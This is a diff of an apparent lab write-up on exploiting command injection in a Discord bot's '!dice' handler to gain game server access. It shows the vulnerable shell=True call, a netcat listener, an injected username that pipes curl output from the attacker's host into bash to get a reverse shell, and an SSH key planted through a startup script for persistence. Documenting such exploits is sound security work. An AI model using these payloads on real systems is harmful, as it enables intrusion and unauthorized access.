@@ -1,7 +1,7 @@
 # Exploiting Discord Bot Vulnerability to Gain Access to Game Server Files
 
 
----
+
 
 
 ## Introduction
@@ -28,7 +28,7 @@ The Vulnerability is a line in the code of the funcion "dice" that permits code 
 if message.content.startswith('!dice'):
     dice = random.randint(1,6)
     username = message.author.display_name
-    subprocess.run(f'python3 ./logWriter.py {username} {dice}', shell=True)  #  <--- Vulnerable code
+    subprocess.run(f'python3 ./logWriter.py {username} {dice}', shell=True)  #  < Vulnerable code
     await message.channel.send(f"{username}, hai estratto: {dice}")
 ```
 Since the code is executed in a shell, inserting a ; in the username allows the shell to treat what follows as a separate command instead of passing it as a parameter to logWriter.py.
@@ -40,7 +40,7 @@ In addition to the code injection vulnerability, the system also presented a mis
 Since this script is executed by the game server process running under `user-b`, modifying its content and then restarting the server makes it possible to execute arbitrary code with `user-b`'s privileges, ultimately granting access to the game server files.
 
   
----
+
 
 
 
@@ -48,7 +48,7 @@ Since this script is executed by the game server process running under `user-b`,
 - Attacker has access to send messages in the Discord chat monitored by the bot.  
 - Attacker is aware of the injection vulnerability in the bot’s username handling.
   
----
+
 
 
 
@@ -73,7 +73,7 @@ nc -lvnp 8081
 ```
 In the response.txt file there is the payload that the attacker wants to execute, wich is sent as a response to http get requests to `process 1`.  
 
----
+
 ## Exploit
 
 The desired payload can not always be injected directly through the username due to the 32-character limit (including spaces).  
@@ -83,7 +83,7 @@ The username used for this injection was:
 ```
 ;curl ip-attacker:8080 | bash;
 ```
----
+
 ## Execution
 
 ### 1)Reverse Shell
@@ -124,7 +124,7 @@ The username was set to:
 
 With the username set, the attacker can trigger the exploit by sending the command `!dice` to the bot.
 
----
+
 
 ## Post-Exploitation
 Once i obtained a reberse shell, and i was able to navigate inside the user-a folder, accessing all doscord bot's files, including user-b's script `server_start.sh`
@@ -134,7 +134,7 @@ Once i obtained a reberse shell, and i was able to navigate inside the user-a fo
 But i did not have access rights to user-b folder, containing the game server's files
 ![Nat Configuration](images/Screenshot_tree.png)
 
----
+
 
 ## Privilege Escalation
 
@@ -165,7 +165,7 @@ The key's randomart image is:
 |oo. . .          |
 |..oo             |
 |ooo.             |
-+----[SHA256]-----+
++-[SHA256]--+
 ```
 Then, I appended the generated public key to `user-b`'s `authorized_keys` by modifying `server_start.sh` as follows:
 
@@ -175,7 +175,7 @@ echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92Zgdr
 ```  
 This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.  
 
----
+
 
 ## Server Restart
 
